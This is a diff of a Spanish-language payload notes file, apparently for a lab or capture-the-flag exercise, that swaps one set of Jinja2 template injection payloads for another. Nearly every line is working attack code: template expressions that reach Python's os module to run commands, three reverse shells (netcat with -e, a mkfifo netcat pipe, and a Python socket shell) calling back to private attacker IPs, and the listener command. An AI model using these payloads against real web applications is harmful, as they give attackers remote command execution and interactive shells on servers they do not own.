@@ -1,16 +1,18 @@
-{{ ''.__class__.__mro__[1].__subclasses__()[xxx]('ls', shell=True, stdout=-1).communicate() }}
+Payloads listos con tu IP atacante 192.168.49.52 y puerto 1234
+1. Netcat con -e (si existe esa versión en la víctima)
+{{ cycler.__init__.__globals__.os.popen("nc -e /bin/bash 192.168.49.52 1234") }}
+
+2. Netcat sin -e (más común)
+{{ cycler.__init__.__globals__.os.popen("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.49.52 1234 > /tmp/f") }}
+
+3. Python reverse shell (muy estable)
+{{ cycler.__init__.__globals__.__builtins__.__import__('os').system("python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.168.49.52\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'") }}
+
+En tu Kali (atacante)
+
+Ejecuta:
+
+nc -lvnp 1234
 
 
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-
-
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-
-
-{{ cycler._init_.__globals__.os.popen('id').read() }}
-
-{{ cycler.__init__.__globals__.os.popen('id').read() }}
-
-{{ cycler.__init__.__globals__['os'].popen("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.52.150 1234 >/tmp/f").read() }}
-
-{{ cycler.__init__.__globals__['os'].popen("nc 192.168.52.150 1234 -e /bin/sh").read() }}
+y espera la conexión.
